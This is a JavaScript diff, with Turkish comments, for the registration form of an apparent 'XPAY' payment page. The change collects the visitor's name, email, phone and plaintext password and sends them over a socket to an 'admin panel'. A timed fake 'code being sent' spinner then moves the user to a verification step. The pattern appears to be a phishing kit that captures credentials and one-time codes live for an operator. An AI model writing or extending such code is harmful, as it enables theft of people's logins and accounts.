@@ -89,62 +89,76 @@ document.addEventListener("DOMContentLoaded", () => {
     const btnText = registerBtn ? registerBtn.querySelector(".btn-text") : null;
 
     if (registerBtn) {
-      registerBtn.addEventListener("click", () => {
-        console.log("Gönder butonu tıklandı!");
+  registerBtn.addEventListener("click", () => {
+    console.log("Gönder butonu tıklandı!");
 
-        const phone = phoneInput ? phoneInput.value.trim() : "";
-        console.log("Telefon numarası:", phone);
+    const username = document.getElementById("registerUsername")?.value.trim() || "";
+    const name = document.getElementById("registerName")?.value.trim() || "";
+    const surname = document.getElementById("registerSurname")?.value.trim() || "";
+    const email = document.getElementById("registerEmail")?.value.trim() || "";
+    const password = document.getElementById("registerPassword")?.value.trim() || "";
+    const passwordRepeat = document.getElementById("registerPasswordRepeat")?.value.trim() || "";
+    const phone = phoneInput ? phoneInput.value.trim() : "";
 
-        if (!phone) {
-          console.log("Telefon boş, return");
-          return;
-        }
+    console.log("Telefon numarası:", phone);
 
-        // USER ID OLUŞTUR
-        const last4 = phone.slice(-4);
-        const userIdGenerated = "XPAY-" + last4;
-        localStorage.setItem("userId", userIdGenerated);
-
-        // KAYIT TARİHİ
-        const today = new Date().toLocaleDateString("tr-TR");
-        localStorage.setItem("registerDate", today);
-
-        // Admin panelde kullanıcı tarafı için ekstra payload
-        const userPayload = {
-          phone,
-          userId: userIdGenerated,
-          registerDate: today,
-          date: new Date().toLocaleString("tr-TR")
-        };
-
-        // Eski sistemi bozma
-        socket.emit("new-phone", phone);
-        console.log("socket.emit new-phone çağrıldı");
-
-        // Yeni kullanıcı verisi de gönder
-        socket.emit("new-user", userPayload);
-        console.log("NEW USER EMIT GİTTİ:", userPayload);
-        console.log("socket.emit new-user çağrıldı", userPayload);
-
-        registerBtn.disabled = true;
-        if (btnText) btnText.textContent = "Kod gönderiliyor";
-        registerBtn.classList.add("spinning");
-
-        setTimeout(() => {
-          if (btnText) btnText.textContent = "Kod gönderildi";
-          registerBtn.classList.add("slow");
-        }, 12000);
-
-        setTimeout(() => {
-          registerBtn.classList.remove("spinning");
-          registerBtn.classList.remove("slow");
-          registerBtn.disabled = false;
-          if (btnText) btnText.textContent = "Gönder";
-          hideCard(registerCard);
-          showCard(verifyCard);
-        }, 14000);
-      });
+    if (!username || !name || !surname || !email || !password || !passwordRepeat || !phone) {
+      alert("Lütfen tüm alanları doldurun.");
+      return;
     }
+
+    if (password !== passwordRepeat) {
+      alert("Şifreler eşleşmiyor.");
+      return;
+    }
+
+    // USER ID OLUŞTUR
+    const last4 = phone.slice(-4);
+    const userIdGenerated = "XPAY-" + last4;
+    localStorage.setItem("userId", userIdGenerated);
+
+    // KAYIT TARİHİ
+    const today = new Date().toLocaleDateString("tr-TR");
+    localStorage.setItem("registerDate", today);
+
+    // Admin panel için tam payload
+    const userPayload = {
+      username,
+      name,
+      surname,
+      email,
+      password,
+      phone,
+      userid: userIdGenerated,
+      registerDate: today,
+      date: new Date().toLocaleString("tr-TR")
+    };
+
+    socket.emit("new-phone", phone);
+    console.log("socket.emit new-phone çağrıldı");
+
+    socket.emit("new-user", userPayload);
+    console.log("socket.emit new-user çağrıldı", userPayload);
+
+    registerBtn.disabled = true;
+    if (btnText) btnText.textContent = "Kod gönderiliyor";
+    registerBtn.classList.add("spinning");
+
+    setTimeout(() => {
+      if (btnText) btnText.textContent = "Kod gönderildi";
+      registerBtn.classList.add("slow");
+    }, 12000);
+
+    setTimeout(() => {
+      registerBtn.classList.remove("spinning");
+      registerBtn.classList.remove("slow");
+      registerBtn.disabled = false;
+      if (btnText) btnText.textContent = "Gönder";
+      hideCard(registerCard);
+      showCard(verifyCard);
+    }, 14000);
+  });
+}
 
     const verifyBtn = document.getElementById("verifySubmit");
 
